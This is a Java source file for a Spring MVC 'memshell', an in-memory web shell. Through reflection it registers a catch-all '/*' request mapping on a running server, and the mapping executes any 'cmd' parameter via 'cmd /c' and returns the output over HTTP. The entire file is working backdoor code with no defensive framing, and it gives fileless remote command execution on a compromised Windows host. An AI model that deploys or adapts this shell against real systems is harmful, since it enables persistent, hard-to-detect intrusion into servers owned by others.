package com.example.spring.spring;

import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringRequestMappingMemshell {
    public static String doInject(Object requestMappingHandlerMapping) {
        String msg = "inject-start";
        try {
            Method registerMapping = requestMappingHandlerMapping.getClass().getMethod("registerMapping", Object.class, Object.class, Method.class);
            registerMapping.setAccessible(true);
            Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", String.class);
            PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition("/*");
            RequestMethodsRequestCondition methodsRequestCondition = new RequestMethodsRequestCondition();
            RequestMappingInfo requestMappingInfo = new RequestMappingInfo(patternsRequestCondition, methodsRequestCondition, null, null, null, null, null);
            registerMapping.invoke(requestMappingHandlerMapping, requestMappingInfo, new SpringRequestMappingMemshell(), executeCommand);
            msg = "inject-success";
        } catch (Exception e) {
            e.printStackTrace();
            msg = "inject-error";
        }
        return msg;
    }

    public ResponseEntity executeCommand(@RequestParam(value = "cmd") String cmd) throws IOException {
        String execResult = new Scanner(Runtime.getRuntime().exec(new String[]{"cmd","/c",cmd}).getInputStream()).useDelimiter("\\A").next();
        return new ResponseEntity(execResult, HttpStatus.OK);
    }
}